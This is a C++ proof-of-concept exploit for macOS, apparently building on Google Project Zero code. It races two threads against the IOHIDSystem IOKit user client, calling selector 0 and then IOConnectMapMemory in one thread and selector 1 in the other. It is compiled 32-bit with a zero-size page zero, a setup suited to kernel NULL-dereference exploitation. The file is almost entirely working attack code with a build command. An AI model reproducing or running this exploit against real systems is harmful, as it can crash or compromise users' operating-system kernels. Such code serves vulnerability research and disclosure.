// Base code from Ian Beer at GOOGLE PROJECT ZERO :)
// clang++ poc.cpp -o poc -lpthread -framework IOKit -framework CoreFoundation -framework CoreFoundation -m32 -Wl,-pagezero_size,0
// Credit : daybreaker

#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <unistd.h>
#include <mach/vm_map.h>
#include <sys/mman.h>
#include <mach/mach_types.h>
#include <IOKit/IOKitLib.h>

#define TABLE_NUM 1000

kern_return_t err;
CFMutableDictionaryRef matching;
io_iterator_t iterator;
io_service_t service;
io_connect_t conn = 0;

uint64_t glglgl = 0;

void call(io_connect_t conn, uint32_t type) {
  uint64_t inputScalar[16];
  unsigned char inputStruct[8192];
  uint64_t outputScalar[16];
  unsigned char outputStruct[8192];

  uint64_t inputScalarCnt = 0;
  size_t inputStructCnt = 0;
  uint32_t outputScalarCnt = 0;
  size_t outputStructCnt = 0;

  uint32_t selector = type;
  
  if(selector == 1)
  {
    inputScalarCnt = 2;

    inputScalar[0] = 0;
    inputScalar[1] = 100;

  }
  else if(selector == 0)
  {
    inputScalarCnt = 2;
    outputScalarCnt = 1;

    inputScalar[0] = 0;
    inputScalar[1] = 0x1000;
  }

  err = IOConnectCallMethod( conn, selector,
     inputScalar,
     inputScalarCnt,
     inputStruct,
     inputStructCnt,
     outputScalar,
     &outputScalarCnt,
     outputStruct,
     &outputStructCnt);

  printf("err : 0x%x (%d)\n",err,selector );
}

void go(void* arg){
  uint32_t type = *(uint32_t *)arg;
  if(type==0)
  {
    vm_address_t * addr = (vm_address_t * )malloc(0x1000);
    vm_size_t sizse = 0x1000;
    call(conn, 0);
    glglgl = 1;err = IOConnectMapMemory(conn, 100, mach_task_self(), addr, &sizse, kIOMapAnywhere);
    printf("map error : 0x%x\n", err );
  }
  else
  {
    while(1)
    {
      if(glglgl)
      {
        break;
      }
    }
    call(conn, 1);
  }
}

int main(int argc, char** argv) {
  sync();


  err = IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iterator);
  if(err)
  {
    printf("matching error: %x \n", err );
    return 0;
  }
  service = IOIteratorNext(iterator);

  uint32_t arg = 0;
  uint32_t arg1 = 1;


  while(1)
  {
    err = IOServiceOpen(service, mach_task_self(), 3, &conn);
    if(err)
    {
      printf("Open err : 0x%x \n",err );
      return 0;
    }
    pthread_t t;
    pthread_create(&t, NULL, (void *(*)(void *)) go, (void *)&arg1);
    go(&arg);
    pthread_join(t, NULL);
  }
  return 0;
}
